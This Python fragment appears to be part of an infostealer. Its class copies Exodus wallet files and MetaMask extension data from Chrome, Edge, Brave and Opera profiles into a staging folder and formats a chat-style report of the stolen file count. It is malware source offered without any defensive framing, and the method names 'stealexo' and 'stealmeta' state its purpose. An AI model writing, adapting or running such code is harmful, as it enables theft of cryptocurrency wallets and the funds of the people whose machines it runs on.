class EXodus:

    def __init__(self):
        self.amountfiles = 0
        self.county = 0
        self.pathyy = os.path.join(P4THF0LDR, "Wallets")
        os.mkdir(self.pathyy)
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(self.path+"\\exodus.wallet")
        except:
            pass
        try:
            paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","3dge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
            profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            self.stealmeta(paths, profs)
        except:
            pass
    
    def stealexo(self, path):
        exopath = os.path.join(self.pathyy, "Exodus")
        os.mkdir(exopath)
        P=os.listdir(path)
        for i in P:
            self.amountfiles += 1
            shutil.copy(path+f"\\{i}",exopath+f"\\{i}")
    
    def stealmeta(self, paths, profs):
        metapath = os.path.join(self.pathyy, "Metamask")
        os.mkdir(metapath)
        for i in paths:
            if "Opera Software" in i:
                try:
                    Path = os.path.join(i,"Local Extension Settings","nkbihfbeogaeaoehlefnkodbefgpgknn")
                    shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                    self.amountfiles += 1;self.county += 1
                except:
                    pass
            else:
                for I in profs:
                    try:
                        if "3dge" in i:
                            i = i.replace("3dge","Edge")
                            lastpart = "ejbalbakoplchlghecdalmeeeajnimhm"
                        else:
                            lastpart = "nkbihfbeogaeaoehlefnkodbefgpgknn"
                            Path = os.path.join(i,I,"Local Extension Settings",lastpart)
                            shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                            self.amountfiles += 1;self.county += 1
                    except:
                        pass

    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Exodus & Metamask``
``|   |_``:page_facing_up: ``({self.amountfiles}) Exodus & Metamask Files``"""